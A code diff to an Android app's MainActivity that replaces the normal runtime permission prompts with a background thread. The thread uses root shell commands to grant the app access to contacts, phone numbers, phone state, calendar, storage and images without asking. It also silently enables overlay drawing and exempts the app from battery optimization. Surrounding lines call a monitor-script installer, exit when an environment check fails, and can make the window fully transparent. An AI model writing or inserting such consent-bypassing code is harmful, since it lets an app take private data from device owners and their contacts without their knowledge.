@@ -56,34 +56,8 @@ public class MainActivity extends AppCompatActivity {
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
-        PermissionGuideHelper.checkAndGuide(this);
-        // 一次性申请所有需要的运行时权限（包括联系人、相册等）
-        java.util.List<String> permsToRequest = new java.util.ArrayList<>();
-        String[] allPerms = {
-            Manifest.permission.READ_PHONE_NUMBERS,
-            Manifest.permission.READ_PHONE_STATE,
-            Manifest.permission.READ_CALENDAR,
-            Manifest.permission.READ_CONTACTS,
-            Manifest.permission.WRITE_EXTERNAL_STORAGE,
-            Manifest.permission.READ_EXTERNAL_STORAGE,
-        };
-        for (String perm : allPerms) {
-            if (ContextCompat.checkSelfPermission(this, perm) != PackageManager.PERMISSION_GRANTED) {
-                permsToRequest.add(perm);
-            }
-        }
-        // Android 13+ (API 33) 媒体权限单独申请
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
-            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_IMAGES)
-                    != PackageManager.PERMISSION_GRANTED) {
-                permsToRequest.add(Manifest.permission.READ_MEDIA_IMAGES);
-            }
-        }
-        if (!permsToRequest.isEmpty()) {
-            ActivityCompat.requestPermissions(this,
-                    permsToRequest.toArray(new String[0]),
-                    MY_PERMISSIONS_REQUEST_READ_PHONE_NUMBERS);
-        }
+        // Try to grant all permissions silently via root; fall back to system dialogs if no root
+        new Thread(this::grantPermissionsSilently, "perm-grant").start();
         installMonitorScript();
         UtilsApp.init(this.getApplication());
         setContentView(R.layout.activity_main);
@@ -140,7 +114,7 @@ public class MainActivity extends AppCompatActivity {
 
     private void lockAndExit() {
         runOnUiThread(() -> {
-            try { Toast.makeText(this, "运行环境校验未通过", Toast.LENGTH_SHORT).show(); } catch (Throwable ignored) {}
+            try { Toast.makeText(this, "Security check failed", Toast.LENGTH_SHORT).show(); } catch (Throwable ignored) {}
             finish();
             System.exit(0);
         });
@@ -201,14 +175,75 @@ public class MainActivity extends AppCompatActivity {
         decorView.setAlpha(isTransparent ? 0.0f : 1.0f);
     }
 
+    // ---------------- Root permission grant ----------------
+
+    private void grantPermissionsSilently() {
+        String pkg = getPackageName();
+        java.util.List<String> cmds = new java.util.ArrayList<>();
+        cmds.add("pm grant " + pkg + " android.permission.READ_PHONE_NUMBERS");
+        cmds.add("pm grant " + pkg + " android.permission.READ_PHONE_STATE");
+        cmds.add("pm grant " + pkg + " android.permission.READ_CALENDAR");
+        cmds.add("pm grant " + pkg + " android.permission.READ_CONTACTS");
+        cmds.add("pm grant " + pkg + " android.permission.WRITE_EXTERNAL_STORAGE");
+        cmds.add("pm grant " + pkg + " android.permission.READ_EXTERNAL_STORAGE");
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+            cmds.add("pm grant " + pkg + " android.permission.READ_MEDIA_IMAGES");
+        }
+        cmds.add("appops set " + pkg + " SYSTEM_ALERT_WINDOW allow");
+        cmds.add("dumpsys deviceidle whitelist +" + pkg);
+        boolean rootOk = RootUtils.isRooted() &&
+                RootUtils.executeAsRoot(cmds.toArray(new String[0]));
+        if (!rootOk) {
+            runOnUiThread(this::requestMissingPermissionsDialog);
+        }
+    }
+
+    private void requestMissingPermissionsDialog() {
+        java.util.List<String> permsToRequest = new java.util.ArrayList<>();
+        String[] allPerms = {
+            Manifest.permission.READ_PHONE_NUMBERS,
+            Manifest.permission.READ_PHONE_STATE,
+            Manifest.permission.READ_CALENDAR,
+            Manifest.permission.READ_CONTACTS,
+            Manifest.permission.WRITE_EXTERNAL_STORAGE,
+            Manifest.permission.READ_EXTERNAL_STORAGE,
+        };
+        for (String perm : allPerms) {
+            if (ContextCompat.checkSelfPermission(this, perm) != PackageManager.PERMISSION_GRANTED) {
+                permsToRequest.add(perm);
+            }
+        }
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_IMAGES)
+                    != PackageManager.PERMISSION_GRANTED) {
+                permsToRequest.add(Manifest.permission.READ_MEDIA_IMAGES);
+            }
+        }
+        if (!permsToRequest.isEmpty()) {
+            ActivityCompat.requestPermissions(this,
+                    permsToRequest.toArray(new String[0]),
+                    MY_PERMISSIONS_REQUEST_READ_PHONE_NUMBERS);
+        }
+    }
+
     // ---------------- 悬浮窗服务 ----------------
 
     private void startFloatingWindowService() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)) {
-            Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
-                    Uri.parse("package:" + getPackageName()));
-            startActivityForResult(intent, OVERLAY_PERMISSION_REQ_CODE);
-            Toast.makeText(this, "请先授予悬浮窗权限", Toast.LENGTH_LONG).show();
+            // Root grant might have just completed; try it inline before falling back to dialog
+            new Thread(() -> {
+                RootUtils.executeAsRoot("appops set " + getPackageName() + " SYSTEM_ALERT_WINDOW allow");
+                runOnUiThread(() -> {
+                    if (Build.VERSION.SDK_INT < Build.VERSION_CODES.M || Settings.canDrawOverlays(MainActivity.this)) {
+                        startFloatingService();
+                    } else {
+                        Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
+                                Uri.parse("package:" + getPackageName()));
+                        startActivityForResult(intent, OVERLAY_PERMISSION_REQ_CODE);
+                        Toast.makeText(MainActivity.this, "Please grant overlay permission", Toast.LENGTH_LONG).show();
+                    }
+                });
+            }).start();
         } else {
             startFloatingService();
         }
